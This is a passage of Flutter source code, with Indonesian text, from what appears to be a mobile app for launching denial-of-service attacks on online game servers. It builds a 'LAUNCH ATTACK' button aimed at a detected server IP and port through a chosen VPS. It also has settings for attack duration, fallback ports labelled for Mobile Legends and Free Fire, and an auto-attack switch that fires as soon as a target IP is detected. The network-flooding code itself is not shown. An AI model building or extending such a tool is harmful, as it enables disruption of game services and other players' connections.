                  color: selected ? const Color(0xFF7C4DFF) : Colors.white24, width: 1.5),
              ),
              child: selected
                  ? const Icon(Icons.check, size: 12, color: Colors.white)
                  : null,
            ),
          ],
        ),
      ),
    );
  }

  // ─── BOTTOM ACTIONS ───────────────────────────────────────────────────
  Widget _buildBottomActions() {
    final canLaunch = _detectedIP.isNotEmpty && _selectedVPS.isNotEmpty;
    final effectivePort = _detectedPort > 0 ? _detectedPort : _targetPort;
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
      child: GestureDetector(
        onTap: canLaunch ? _launchAttack : null,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 300),
          height: 56,
          decoration: BoxDecoration(
            gradient: canLaunch
                ? const LinearGradient(
                    colors: [Color(0xFFE53935), Color(0xFFFF6D00)],
                    begin: Alignment.topLeft, end: Alignment.bottomRight)
                : null,
            color: canLaunch ? null : Colors.white.withOpacity(0.05),
            borderRadius: BorderRadius.circular(16),
            boxShadow: canLaunch ? [BoxShadow(
              color: Colors.red.withOpacity(0.4),
              blurRadius: 20, offset: const Offset(0, 5),
            )] : [],
            border: canLaunch ? null : Border.all(color: Colors.white12),
          ),
          child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
            Text(canLaunch ? '⚡' : '🔒', style: const TextStyle(fontSize: 18)),
            const SizedBox(width: 10),
            Text(
              canLaunch
                  ? 'LAUNCH ATTACK  ›  $_detectedIP:$effectivePort'
                  : _vpnScanActive ? 'Mendeteksi server game...' : 'Mulai scan untuk deteksi IP',
              style: TextStyle(
                color: canLaunch ? Colors.white : Colors.white24,
                fontWeight: FontWeight.w900,
                fontSize: 13, letterSpacing: 0.5,
              ),
            ),
          ]),
        ),
      ),
    );
  }

  // ─── SETTINGS ─────────────────────────────────────────────────────────
  void _showSettings() {
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF12122A),
      shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setLocal) => Padding(
          padding: const EdgeInsets.fromLTRB(20, 8, 20, 24),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(width: 40, height: 4, margin: const EdgeInsets.only(bottom: 16),
                decoration: BoxDecoration(color: Colors.white24,
                    borderRadius: BorderRadius.circular(2))),
            const Text('⚙️ Pengaturan Attack',
                style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
            const SizedBox(height: 8),

            _settingRow(Icons.timer, 'Durasi Attack',
              DropdownButton<int>(
                value: _attackDuration, dropdownColor: const Color(0xFF1A1A2E),
                underline: const SizedBox(),
                items: [30, 60, 120, 300].map((d) =>
                    DropdownMenuItem(value: d, child: Text('$d detik'))).toList(),
                onChanged: (v) { if (v != null) { setState(() => _attackDuration = v); setLocal(() {}); } },
              ),
            ),
            _settingRow(Icons.router, 'Port Fallback',
              DropdownButton<int>(
                value: _targetPort, dropdownColor: const Color(0xFF1A1A2E),
                underline: const SizedBox(),
                items: const [
                  DropdownMenuItem(value: 5078,  child: Text('5078 (ML)')),
                  DropdownMenuItem(value: 10001, child: Text('10001')),
                  DropdownMenuItem(value: 10000, child: Text('10000')),
                  DropdownMenuItem(value: 20001, child: Text('20001')),
                  DropdownMenuItem(value: 7086,  child: Text('7086 (FF)')),
                ],
                onChanged: (v) { if (v != null) { setState(() => _targetPort = v); setLocal(() {}); } },
              ),
            ),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
              child: Text(
                '💡 Port fallback hanya dipakai jika IP terdeteksi tapi port belum diketahui',
                style: const TextStyle(color: Colors.white38, fontSize: 10),
              ),
            ),
            SwitchListTile(
              secondary: const Icon(Icons.bolt, color: Color(0xFF7C4DFF)),
              title: const Text('Auto-Attack'),
              subtitle: const Text('Langsung attack saat IP ditemukan',
                  style: TextStyle(fontSize: 11, color: Colors.white38)),
              value: _autoAttack, activeColor: const Color(0xFF7C4DFF),
              onChanged: (v) { setState(() => _autoAttack = v); setLocal(() {}); },
            ),
          ]),
        ),
      ),
    );
  }

  Widget _settingRow(IconData icon, String label, Widget control) {
    return ListTile(
      leading: Icon(icon, color: const Color(0xFF7C4DFF), size: 20),
      title: Text(label, style: const TextStyle(fontSize: 13)),
      trailing: control,
    );
  }
}

// ─── Custom Painter: Radar Sweep ──────────────────────────────────────────────
class _RadarSweepPainter extends CustomPainter {
  final double progress;
  _RadarSweepPainter(this.progress);

  @override
  void paint(Canvas canvas, Size size) {
    final center = Offset(size.width / 2, size.height / 2);
    final radius = size.width / 2;
    final angle  = progress * 2 * math.pi - math.pi / 2;

    // Sweep gradient
    final sweepPaint = Paint()
      ..shader = SweepGradient(
        startAngle: angle - 1.2,
        endAngle:   angle,
        colors: [
          Colors.transparent,
          const Color(0xFF7C4DFF).withOpacity(0.6),
        ],
      ).createShader(Rect.fromCircle(center: center, radius: radius))
      ..style = PaintingStyle.fill;

    canvas.drawArc(
      Rect.fromCircle(center: center, radius: radius),
      angle - 1.2, 1.2, true, sweepPaint,
    );

    // Sweep line
    final linePaint = Paint()
      ..color = const Color(0xFF7C4DFF).withOpacity(0.8)
      ..strokeWidth = 1.5
      ..style = PaintingStyle.stroke;

    canvas.drawLine(
      center,
      Offset(center.dx + radius * math.cos(angle),
             center.dy + radius * math.sin(angle)),
      linePaint,
    );
  }

  @override
  bool shouldRepaint(_RadarSweepPainter old) => old.progress != progress;
}
